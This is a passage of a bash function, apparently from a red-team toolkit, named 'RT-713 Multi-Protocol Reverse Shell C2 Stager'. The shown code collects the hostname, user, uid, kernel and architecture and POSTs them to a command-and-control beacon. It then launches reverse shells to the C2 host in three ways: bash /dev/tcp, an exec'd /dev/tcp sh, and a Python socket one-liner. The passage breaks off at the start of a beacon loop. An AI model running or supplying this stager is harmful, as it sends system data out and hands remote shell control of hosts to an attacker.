rt_713_reverse_shell_c2_stager() {
    rt_banner "RT-713" "Multi-Protocol Reverse Shell C2 Stager"
    local C2_HOST="$EXFIL_HOST"
    local C2_PORT="$EXFIL_PORT"
    local HOSTNAME
    HOSTNAME=$(hostname 2>/dev/null)
    local USER
    USER=$(whoami 2>/dev/null)
    local BEACON_URL="http://$C2_HOST:$C2_PORT/beacon"
    
    # Stager: try multiple reverse shell methods in order of reliability
    echo -e "    $CYAN[*] C2 Host: $C2_HOST:$C2_PORT | Beacon: $BEACON_URL$NC"
    
    # 1. Register beacon with C2 server
    local REG_DATA="hostname=$HOSTNAME\&user=$USER\&uid=$(id -u)\&kernel=$(uname -r)\&arch=$(uname -m)"
    local REG
    REG=$(curl -sk -X POST "$BEACON_URL/register" --data "$REG_DATA" --connect-timeout 5 -m 10 2>/dev/null)
    echo -e "    $CYAN[*] Registration: $REG$NC"
    
    # 2. Start reverse shell background listener
    # Method A: bash TCP
    bash -i >& /dev/tcp/$C2_HOST/$C2_PORT 0>&1 &
    local PID1=$!
    
    # Method B: if bash fails, use /dev/tcp with exec
    (exec 3<>/dev/tcp/$C2_HOST/$((C2_PORT + 1)); if command -v sh &>/dev/null; then sh <&3 >&3 2>&3; fi) &
    local PID2=$!
    
    # Method C: Python reverse shell
    if command -v python3 &>/dev/null || command -v python &>/dev/null; then
        local PY
        PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null)
        local PY_PORT=$((C2_PORT + 2))
        C2_HOST="$C2_HOST" C2_PORT="$PY_PORT" "$PY" -c 'import socket,subprocess,os,sys;s=socket.socket();s.connect((os.environ["C2_HOST"],int(os.environ["C2_PORT"])));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' &
        local PID3=$!
    fi
    
    # Method D: Background beacon loop
    (
        while true; do
